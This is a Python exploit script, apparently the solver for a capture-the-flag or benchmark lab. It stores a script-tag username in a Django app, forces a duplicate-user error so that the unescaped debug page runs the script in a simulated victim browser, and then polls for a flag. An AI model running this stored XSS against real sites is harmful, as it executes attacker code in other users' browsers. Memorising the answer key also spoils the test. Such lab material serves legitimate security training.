#!/usr/bin/env python3
"""Trigger a separate browser victim on Django's unescaped error page."""

import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request


USERNAME = '<script src=/p></script>'


def fetch(target_url: str, path: str, query: dict[str, str] | None = None) -> tuple[int, str]:
    url = f"{target_url.rstrip('/')}{path}"
    if query:
        url += '?' + urllib.parse.urlencode(query)
    try:
        response = urllib.request.urlopen(url, timeout=15)
    except urllib.error.HTTPError as error:
        response = error
    with response:
        return response.status, response.read().decode('utf-8', errors='replace')


def wait_for_ready(target_url: str) -> None:
    deadline = time.monotonic() + 120
    while time.monotonic() < deadline:
        try:
            status, body = fetch(target_url, '/health/')
            if status == 200 and body == 'ready':
                return
        except (OSError, TimeoutError):
            pass
        time.sleep(2)
    raise RuntimeError('Django application did not become ready')


def start_victim(target_url: str) -> None:
    deadline = time.monotonic() + 30
    while time.monotonic() < deadline:
        try:
            status, body = fetch(target_url, '/victim/visit/', {'username': USERNAME})
            if status == 202 and body == 'victim visit started':
                return
        except (OSError, TimeoutError):
            pass
        time.sleep(2)
    raise RuntimeError('victim browser did not start')


def wait_for_flag(target_url: str) -> str:
    deadline = time.monotonic() + 90
    while time.monotonic() < deadline:
        try:
            status, body = fetch(target_url, '/xss-result/')
            if status == 200:
                flag = body.strip()
                if re.fullmatch(r'jaylbreak\.win\{[^}]+\}', flag):
                    return flag
                raise RuntimeError('application returned an invalid flag')
        except (OSError, TimeoutError):
            pass
        time.sleep(2)
    raise RuntimeError('browser execution did not release the flag')


def exploit(target_url: str) -> str:
    wait_for_ready(target_url)
    status, body = fetch(target_url, '/create_user/', {'username': USERNAME})
    if status != 200:
        raise RuntimeError('could not seed the malicious username')
    status, body = fetch(target_url, '/create_user/', {'username': USERNAME})
    if status != 500 or USERNAME not in body:
        raise RuntimeError('duplicate username did not reach the vulnerable debug page')
    start_victim(target_url)
    return wait_for_flag(target_url)


def main() -> None:
    target_url = os.environ.get('REMOTE_TARGET_URL')
    if not target_url:
        raise RuntimeError('REMOTE_TARGET_URL is required')
    print(json.dumps({'evidence_payload': {'flag': exploit(target_url)}}))


if __name__ == '__main__':
    try:
        main()
    except (RuntimeError, OSError) as error:
        print(str(error), file=sys.stderr)
        raise SystemExit(1)
